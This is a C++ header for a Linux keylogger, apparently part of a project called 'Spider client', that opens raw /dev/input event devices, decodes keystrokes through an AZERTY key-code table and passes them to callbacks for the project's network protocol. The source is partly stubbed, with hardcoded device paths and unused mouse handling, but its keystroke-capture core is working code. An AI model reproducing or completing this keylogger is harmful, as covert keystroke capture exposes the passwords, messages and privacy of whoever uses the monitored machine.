//
// Created by roman sztergbaum on 27/09/2017.
//

#ifndef SPIDER_CLIENT_LINUXKEYLOGGER_HPP
#define SPIDER_CLIENT_LINUXKEYLOGGER_HPP

#include <linux/input.h>
#include <memory>
#include <unordered_map>
#include <boost/bind.hpp>
#include <config/Config.hpp>
#include <KeyLogger/KeyLogger.hpp>
#include <Protocol/MessagesEnums.hpp>
#include <Network/IOManager.hpp>
#include <Network/PosixStream.hpp>
#include <Network/BufferView.hpp>

namespace spi::details
{
    class FileWatcher
    {
    public:
        using MouseMoveCallback = std::function<void(proto::MouseMove &)>;
        using KeyPressCallback = std::function<void(proto::KeyEvent &)>;
        using MouseClickCallback = std::function<void(proto::MouseClick &)>;

        FileWatcher(net::IOManager &mgr, int fd) : _stream(mgr, fd)
        {
            _buff.resize(sizeof(input_event));
        }

        void asyncRead()
        {
            _nbReadBytes = 0;
            _stream.asyncRead(_buff, boost::bind(&FileWatcher::__keypadInput, this, net::ErrorPlaceholder,
                                                 net::BytesTransferredPlaceholder));
        }

        void onMouseMoveEvent(MouseMoveCallback &&callback) noexcept
        {
            _mouseMoveCallback = std::move(callback);
        }

        void onMouseClickEvent(MouseClickCallback &&callback) noexcept
        {
            _mouseClickCallback = std::move(callback);
        }

        void onKeyboardEvent(KeyPressCallback &&callback) noexcept
        {
            _keyPressCallback = std::move(callback);
        }

    private:
        void __keypadInput(const ErrorCode &err, std::size_t len)
        {
            if (err) {
                _log(logging::Warning) << "couldn't read key input file " << err.message() << std::endl;
            }

            _nbReadBytes += len;
            if (_nbReadBytes < sizeof(input_event)) {
                __readMore();
            } else {
                struct input_event ie;
                std::memcpy(&ie, _buff.data(), len);
                static const std::unordered_map<unsigned long, proto::KeyCode> toBinds = {
                    {16,  proto::KeyCode::a},
                    {17,  proto::KeyCode::z},
                    {18,  proto::KeyCode::e},
                    {19,  proto::KeyCode::r},
                    {20,  proto::KeyCode::t},
                    {21,  proto::KeyCode::y},
                    {22,  proto::KeyCode::u},
                    {23,  proto::KeyCode::i},
                    {24,  proto::KeyCode::o},
                    {25,  proto::KeyCode::p},
                    {34,  proto::KeyCode::g},
                    {35,  proto::KeyCode::h},
                    {36,  proto::KeyCode::j},
                    {37,  proto::KeyCode::k},
                    {38,  proto::KeyCode::l},
                    {39,  proto::KeyCode::m},
                    {44,  proto::KeyCode::w},
                    {45,  proto::KeyCode::x},
                    {46,  proto::KeyCode::c},
                    {47,  proto::KeyCode::v},
                    {48,  proto::KeyCode::b},
                    {49,  proto::KeyCode::n},
                    {14,  proto::KeyCode::Backspace},
                    {15,  proto::KeyCode::Tab},
                    {1,   proto::KeyCode::Escape},
                    {42,  proto::KeyCode::Shift},
                    {54,  proto::KeyCode::Shift},
                    {57,  proto::KeyCode::Space},
                    {29,  proto::KeyCode::Ctrl},
                    {97,  proto::KeyCode::Ctrl},
                    {56,  proto::KeyCode::Alt},
                    {100, proto::KeyCode::AltGr},
                    {11,  proto::KeyCode::_0},
                    {2,   proto::KeyCode::_1},
                    {3,   proto::KeyCode::_2},
                    {4,   proto::KeyCode::_3},
                    {5,   proto::KeyCode::_4},
                    {6,   proto::KeyCode::_5},
                    {7,   proto::KeyCode::_6},
                    {8,   proto::KeyCode::_7},
                    {9,   proto::KeyCode::_8},
                    {10,  proto::KeyCode::_9},
                    {56,  proto::KeyCode::Alt},
                    {100, proto::KeyCode::AltGr},
                    {59,  proto::KeyCode::F1},
                    {60,  proto::KeyCode::F2},
                    {61,  proto::KeyCode::F3},
                    {62,  proto::KeyCode::F4},
                    {63,  proto::KeyCode::F5},
                    {64,  proto::KeyCode::F6},
                    {65,  proto::KeyCode::F7},
                    {66,  proto::KeyCode::F8},
                    {67,  proto::KeyCode::F9},
                    {68,  proto::KeyCode::F10},
                    {87,  proto::KeyCode::F11},
                    {88,  proto::KeyCode::F12},
                    {104, proto::KeyCode::PageUp},
                    {109, proto::KeyCode::PageDown},
                    {111, proto::KeyCode::Delete},
                };
                proto::KeyEvent keyEvent;
                keyEvent.state = ie.value ? proto::KeyState::Down : proto::KeyState::Up;
                keyEvent.timestamp = std::chrono::steady_clock::now();
                if (toBinds.find(ie.code) != toBinds.end() && ie.value <= 1) {
                    _log(logging::Debug) << " event : " << ie.code << " value = " << ie.value << std::endl;
                    keyEvent.code = toBinds.at(ie.code);
                    _keyPressCallback(keyEvent);
                } else {
                    _log(logging::Warning) << " Unhandled KeyEvent {" << ie.code << "}" << std::endl;
                }
                asyncRead();
            }
        }

        void __readMore()
        {
            _stream.asyncRead(net::BufferView(_buff.data() + _nbReadBytes, _buff.size() - _nbReadBytes),
                              boost::bind(&FileWatcher::__keypadInput, this, net::ErrorPlaceholder,
                                          net::BytesTransferredPlaceholder));
        }

        Buffer _buff;
        unsigned long _nbReadBytes{0};
        net::PosixStream _stream;
        logging::Logger _log{"Keylogger-filewatcher", logging::Level::Debug};
        MouseMoveCallback _mouseMoveCallback;
        MouseClickCallback _mouseClickCallback;
        KeyPressCallback _keyPressCallback;
    };
}

namespace spi
{
    class LinuxKeyLogger : public KeyLogger
    {
    public:
        explicit LinuxKeyLogger(net::IOManager &service) : _service(service)
        {
            _buff.resize(sizeof(input_event));

            // parse /proc/bus/input/devices
            // and construct the vectors of files to watch
        }

        ~LinuxKeyLogger() override
        {
            _log(logging::Info) << "shutting down." << std::endl;
        }

        void setup() override
        {
            for (const auto &i : _keyPadToWatch) {
                int currentFd = ::open(i.c_str(), O_RDONLY);

                if (currentFd == -1) {
                    throw std::runtime_error("Cannot Open File");
                }
                _keyInputStream.push_back(details::FileWatcher(_service, currentFd));
                _keyInputStream.back().asyncRead();
                _keyInputStream.back().onMouseMoveEvent(boost::bind(&LinuxKeyLogger::__onMouEv, this, _1));
                _keyInputStream.back().onMouseClickEvent(boost::bind(&LinuxKeyLogger::__onCliEv, this, _1));
                _keyInputStream.back().onKeyboardEvent(boost::bind(&LinuxKeyLogger::__onKeyEv, this, _1));
            }

            _log(logging::Info) << "successfully initialized." << std::endl;
        }

        void run() override
        {
            _log(logging::Info) << "started." << std::endl;

            // add the watchers on the files
            // non blocking read with callback on event
        }

        void stop() override
        {
            _log(logging::Info) << "stopped." << std::endl;
            _keyInputStream.clear();
            _mouseInputStream.clear();
        }

    private:

        void __onKeyEv(proto::KeyEvent ev)
        {
            _keyPressCallback(std::move(ev));
        }

        void __onMouEv(proto::MouseMove ev)
        {
            _mouseMoveCallback(std::move(ev));
        }

        void __onCliEv(proto::MouseClick ev)
        {
            _mouseClickCallback(std::move(ev));
        }

        // only works with tek pc, need to be constructed out of
        // the parsing of /proc/bus/input/devices
        std::vector<char> _buff;
        std::vector<details::FileWatcher> _keyInputStream;
        std::vector<net::PosixStream> _mouseInputStream;
        net::IOManager &_service;
        std::vector<std::string> _keyPadToWatch{"/dev/input/event3"};
        std::vector<std::string> _mouseToWatch{"/dev/input/event4", "/dev/input/event7"};
    };
}

namespace spi::details
{
    static always_inline KeyLogPtr createKeyLogger(net::IOManager &service)
    {
        return std::make_unique<LinuxKeyLogger>(service);
    }
}
#endif //SPIDER_CLIENT_LINUXKEYLOGGER_HPP
